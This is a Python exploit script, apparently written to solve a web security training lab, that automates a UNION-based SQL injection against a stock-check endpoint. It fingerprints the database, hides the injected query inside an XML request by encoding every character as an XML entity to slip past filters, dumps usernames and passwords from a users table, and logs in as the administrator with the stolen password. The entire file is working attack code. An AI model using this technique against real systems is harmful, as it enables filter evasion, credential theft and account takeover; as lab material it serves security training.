import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def get_csrf_token(s, url, path):
    login_url = url + path
    r = s.get(login_url, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def login_acc(s, url, username, password):
    login_url = url + '/login'
    payload = {
        "csrf": get_csrf_token(s, url, '/login'),
        "username": username,
        "password": password
    }
    r = s.post(login_url, data=payload, headers=headers)

    if 'Log out' in r.text:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def detect_database(s, url, path):
    target_url = url + path
    print("[+] Detecting Database Type...")

    # 1. Test Oracle
    sql_oracle = f"1 UNION SELECT banner FROM v$version"
    r_oracle = s.post(target_url, data=xml_payload(sql_oracle))
    if "Oracle" in r_oracle.text:
        print("[+] Database detected: Oracle")
        return "Oracle"

    # 2. Test @@version variable (MySQL or Microsoft SQL Server)
    sql_at_version = f"1 UNION SELECT @@version--%20"
    has_at_version = s.post(target_url, data=xml_payload(sql_at_version))

    # 3. Test version() function (MySQL or PostgreSQL)
    sql_func_version = f"1 UNION SELECT version()--%20"
    has_func_version = s.post(target_url, data=xml_payload(sql_func_version))

    if "MySQL" in has_at_version.text and "MySQL" in has_func_version.text:
        print("[+] Database detected: MySQL")
        print(has_at_version.text)
        return "MySQL"
    elif "Microsoft" in has_at_version.text and "Microsoft" not in has_func_version.text:
        print("[+] Database detected: Microsoft SQL Server")
        print(has_at_version.text)
        return "Microsoft"
    elif "PostgreSQL" not in has_at_version.text and "PostgreSQL" in has_func_version.text:
        print("[+] Database detected: PostgreSQL")
        print(has_func_version.text)
        return "PostgreSQL"
    else:
        print("[-] Could not detect database type. Defaulting to Unknown.")
        return "Unknown"
    
def dec_entities(payload):
    encoded_chars = []
    for char in payload:
        encoded_chars.append(f"&#{ord(char)};")
    return ''.join(encoded_chars)

def xml_payload(sql_injection):
    return f"""<?xml version="1.0" encoding="UTF-8"?>
        <stockCheck>
            <productId>1</productId>
            <storeId>{dec_entities(sql_injection)}</storeId>
        </stockCheck>
    """

def vuln_req(s, url, path):
    target_url = url + path
    sql_injection = "1 UNION SELECT username || '~' || password FROM users"
    r = s.post(target_url, data=xml_payload(sql_injection))
    
    if 'administrator' in r.text:
        print('[+] Successful sql injection bypass')
        return r.text
    print('[-] Fail to sql injection bypass')
    sys.exit(-1)

def get_admin_credential(r):
    users = r.strip().split('\n')
    for credential in users:
        username, password = credential.split('~')
        if username == 'administrator':
            return password
    print('[-] Not found administrator credential')
    sys.exit(-1)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]

    detect_database(s, url, '/product/stock')
    users = vuln_req(s, url, '/product/stock')
    password = get_admin_credential(users)
    login_acc(s, url, 'administrator', password)
    check_solved_lab(s, url)


if __name__ == '__main__':
    main()